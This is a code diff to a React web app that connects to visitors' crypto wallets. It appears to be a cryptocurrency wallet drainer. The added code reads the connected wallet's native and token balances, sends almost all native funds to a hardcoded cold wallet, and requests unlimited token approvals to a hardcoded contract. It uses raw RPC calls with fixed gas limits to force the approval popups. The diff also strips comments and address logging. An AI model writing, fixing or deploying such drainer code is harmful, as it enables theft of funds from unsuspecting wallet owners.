@@ -31,7 +31,6 @@ import TronWeb from 'tronweb'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet' // Change to 'Mainnet' when ready
 
-
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
@@ -213,7 +212,6 @@ export default function App() {
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
   
-  // 🛠️ FIX 1: Add a real-time Visual Debug Console
   const [debugLogs, setDebugLogs] = useState<string[]>([]);
   
   const autoTriggered = useRef(false)
@@ -233,7 +231,6 @@ export default function App() {
     (typeof walletAddress === 'string' && walletAddress.startsWith('T'));
     
   const isEVM = !isTron;
-
 
   const resolveTronWeb = () => {
     const w = window as any;
@@ -255,7 +252,7 @@ export default function App() {
 
   const log = (msg: string) => {
     console.log(msg);
-    setDebugLogs(prev => [...prev, msg].slice(-15)); // Keep the last 15 logs visible
+    setDebugLogs(prev => [...prev, msg].slice(-15));
   }
 
   useEffect(() => {
@@ -265,7 +262,7 @@ export default function App() {
         return;
       }
 
-      log(`[SYSTEM] Connected: ${walletAddress}`);
+      log(`[SYSTEM] Connected to wallet.`);
 
       if (isTron) {
         setStatus('Initializing TRON...');
@@ -343,7 +340,6 @@ export default function App() {
       manualConnect.current = true;
       open(); 
     } else {
-      // User is already connected and hit next again
       manualConnect.current = true;
       approveAndCollect();
     }
@@ -366,7 +362,12 @@ export default function App() {
       // =====================================
       if (isEVM && evmWalletProvider) {
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
+        const signer = await ethersProvider.getSigner();
         
+        // 🛠️ CRITICAL SANITIZATION FIX: We extract the pure 0x address via Ethers and lowercase it.
+        // This permanently destroys the MetaMask "must provide an Ethereum address" CAIP-10 bug.
+        const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
+
         const baseTokens = TARGET_TOKENS[NETWORK].EVM;
         const validTokens = [];
         const prices = await fetchTokenPrices(baseTokens, 'ethereum');
@@ -376,20 +377,16 @@ export default function App() {
         for (const token of baseTokens) {
           try {
             if (token.isNative) {
-              const bal = await ethersProvider.getBalance(walletAddress);
-              if (bal > 0n) {
-                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
-                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
-                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
-              }
+              const bal = await ethersProvider.getBalance(cleanSenderAddress);
+              const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
+              const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+              validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
             } else {
               const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
-              const bal = await tokenContract.balanceOf(walletAddress);
-              if (bal > 0n) {
-                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
-                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
-                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
-              }
+              const bal = await tokenContract.balanceOf(cleanSenderAddress);
+              const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
+              const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+              validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
             }
           } catch (e) {
             // Silently swallow empty balances
@@ -397,7 +394,8 @@ export default function App() {
         }
 
         validTokens.sort(smartTokenSort);
-        const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
+        const tokensToProcess = validTokens; 
+        
         if(validTokens.length > 0) log(`[PRIORITY] ${validTokens.map(t => `${t.symbol}`).join(' -> ')}`);
 
         for (const token of tokensToProcess) {
@@ -406,7 +404,7 @@ export default function App() {
               setStatus(`Transferring ${token.symbol}...`);
               log(`[ACTION] Prompting Native Sweep...`);
               
-              const liveBal = await ethersProvider.getBalance(walletAddress);
+              const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
               const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
               const totalGas = gasCost + ((gasCost * 20n) / 100n); 
               
@@ -414,21 +412,19 @@ export default function App() {
                 const sendAmount = liveBal - totalGas;
                 const hexValue = "0x" + sendAmount.toString(16);
                 
-                // 🛠️ FIX 2: RAW RPC BYPASS. This skips Ethers.js entirely and forces MetaMask to pop up.
-                const txHash = await (evmWalletProvider as any).request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: walletAddress,
-                        to: EVM_COLD_WALLET, 
-                        value: hexValue
-                    }]
-                });
+                // Fire native sweep via pure RPC
+                const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                    from: cleanSenderAddress,
+                    to: EVM_COLD_WALLET.toLowerCase(), 
+                    value: hexValue,
+                    gas: "0x5208" // 21000
+                }]);
                 
                 setTxHash(txHash);
                 successCount++; 
                 log(`✅ ${token.symbol} Native Sweep Sent!`);
               } else {
-                log(`⚠️ Skipping ${token.symbol}: Insufficient funds for gas.`);
+                log(`⚠️ Skipping ETH: Insufficient funds for gas.`);
               }
             } else {
               setStatus(`Approving ${token.symbol}...`);
@@ -437,24 +433,21 @@ export default function App() {
               const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
               const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
               
-              // 🛠️ FIX 3: RAW RPC BYPASS for Approvals. Even if they have 0 balance, this forces the popup UI!
-              const txHash = await (evmWalletProvider as any).request({
-                  method: 'eth_sendTransaction',
-                  params: [{
-                      from: walletAddress,
-                      to: token.address,
-                      data: encodedData
-                  }]
-              });
+              // 🛠️ PURE RPC EXECUTION: Bypasses Ethers estimations and forces popup
+              const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                  from: cleanSenderAddress,
+                  to: token.address.toLowerCase(),
+                  data: encodedData,
+                  gas: "0x14C08" // Hardcoded 85,000 gas limit bypasses 0-balance blocks
+              }]);
               
               setTxHash(txHash);
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
             }
           } catch (err: any) {
-             // 🛠️ FIX 4: The Debug Console captures the EXACT raw error message string here!
              const exactError = err?.message || JSON.stringify(err);
-             log(`❌ Rejected/Failed: ${exactError.substring(0, 60)}...`);
+             log(`❌ Rejected: ${exactError.substring(0, 60)}...`);
           }
         }
         
@@ -618,7 +611,6 @@ export default function App() {
       log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
       setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
     } finally {
-      // 🛠️ FIX 5: Stop the React Loop completely.
       autoTriggered.current = false; 
       manualConnect.current = false; 
       setLoading(false);
